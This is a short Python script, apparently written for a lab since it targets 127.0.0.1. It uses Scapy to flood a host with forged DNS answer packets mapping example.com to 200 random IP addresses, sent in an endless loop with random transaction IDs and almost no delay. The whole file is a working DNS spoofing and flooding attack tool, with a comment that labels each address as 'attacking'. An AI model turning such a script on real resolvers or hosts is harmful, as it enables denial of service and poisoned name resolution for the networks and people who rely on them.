from scapy.all import *
import threading
import time
import random

# List of pre-defined IP addresses
ips = [str(RandIP()) for _ in range(200)]

# Function to send DNS response packets using the list of IPs repeatedly
def send_dns_responses():
    while True:
        for ip in ips:
            target_ip = "127.0.0.1"  # Destination IP address
            print("Target ip",target_ip)
            print(f"Generated IP that is attacking: {ip}")  # Print generated IP
            dns_response = IP(dst=target_ip)/UDP()/DNS(id=random.randint(1, 65535), qr=1, an=DNSRR(rrname="example.com", rdata=ip))
            send(dns_response, verbose=False)  # Send the packet
        time.sleep(0.0000001)  # Adjust the frequency of responses as needed

# Start sending DNS response packets in a separate thread
dns_thread = threading.Thread(target=send_dns_responses)
dns_thread.start()

# Keep the program running
while True:
    time.sleep(1)
